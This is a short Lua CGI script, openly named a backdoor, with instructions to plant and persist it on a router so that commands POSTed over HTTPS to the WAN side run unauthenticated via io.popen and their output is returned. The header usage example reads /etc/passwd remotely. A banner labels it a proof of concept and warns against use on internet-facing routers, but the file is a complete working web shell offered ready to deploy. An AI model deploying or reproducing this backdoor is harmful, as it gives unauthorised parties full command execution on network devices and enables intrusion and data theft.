#!/usr/bin/env lua
-- backdoor.lua -- 
-- Place as /var/sbdc/backdoor.ha 
-- Make executable: chmod 0755 /var/sbdc/backdoor.ha 
-- persist file using pfs -a /var/sbdc/backdoor.ha 
-- make sure the file gets saved using pfs -a
-- Usage example:
--   echo -n "cat /etc/passwd" | curl -k -X POST --data-binary @- https://<router-wan-ip>:61001/backdoor.ha

local io = io
local os = os
local tonumber = tonumber
local tostring = tostring

-- Read CONTENT_LENGTH (if provided) and read that many bytes from stdin,
-- otherwise read all available.
local content_len = tonumber(os.getenv("CONTENT_LENGTH") or "0")
local body = ""
if content_len and content_len > 0 then
  body = io.read(content_len) or ""
else
  -- read whatever is available (works with curl -d / --data-binary)
  body = io.read("*a") or ""
end

-- Trim leading/trailing whitespace (spaces, tabs, CR, LF)
local function trim(s)
  if not s then return "" end
  -- remove leading
  s = s:gsub("^%s+", "")
  -- remove trailing
  s = s:gsub("%s+$", "")
  return s
end

local token = trim(body)

-- HTTP header
io.write("Content-Type: text/plain\r\n\r\n")
io.write("POC-CGI-EXECUTIO-SHELL: DO NOT RUN ON A REAL ROUTER CONNECTED TO THE INTERNET\n")

if token == "" then
  io.write("error: no command token supplied (POST command to run)\n")
  return
end

io.write("Requested cmd: " .. token .. "\n\n")

-- Run the command and capture output
local f, ferr = io.popen(token, "r")
if not f then
  io.write("failed to execute command: ", tostring(ferr or "unknown"), "\n")
  os.exit(1)
end

local out = f:read("*a") or ""
f:close()

-- Optionally truncate long outputs in case device returns huge data
local MAX_OUTPUT = 32 * 1024  -- 32 KB
if #out > MAX_OUTPUT then
  io.write(out:sub(1, MAX_OUTPUT))
  io.write("\n[output truncated, length=", tostring(#out), "]\n")
else
  io.write(out)
end

io.write("\n--- end ---\n")
